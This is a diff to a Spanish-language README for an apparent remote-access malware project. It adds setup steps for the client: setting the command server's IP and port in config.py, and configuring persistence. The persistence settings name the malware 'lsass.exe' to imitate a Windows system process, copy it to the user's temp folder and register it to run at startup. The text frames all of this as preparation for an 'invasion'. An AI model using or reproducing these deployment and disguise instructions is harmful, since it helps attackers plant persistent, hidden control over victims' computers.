@@ -43,6 +43,24 @@ Para el cliente hacemos los mismos pasos que la vez anterior:
 ```
 cd client/core/
 ```
+Una vez en ese directorio, con el editor que quieran, abran el archivo "config.py", y el resto ya lo saben :)
+
+```
+vim config.py
+```
+
+Ahi modificaremos las variables IP y PORT del servidor, guardamos y listo.
+
+### Configuraciones extra ###
+
+Otra pequeña configuración es el de la persistencia:
+
+```
+NOMBRE_MALWARE = "lsass.exe"        # Acá podrán cambiar el nombre del malware que será copiado para obtener persistencia
+RUTA_MALWARE_DESTINO = tempfile.gettempdir() + "\\" + NOMBRE_MALWARE    # La ruta donde se copiará el malware. Por defecto, se copiará en los archivos temporales del usuario
+NOMBRE_REGISTRO_MALWARE = NOMBRE_MALWARE[:-4]   # Nombre que tendrá el registro de autoejecucion del malware, por defecto lleva el nombre original del programa
+
+```
 
 
 ## Empezar con la invasión ##
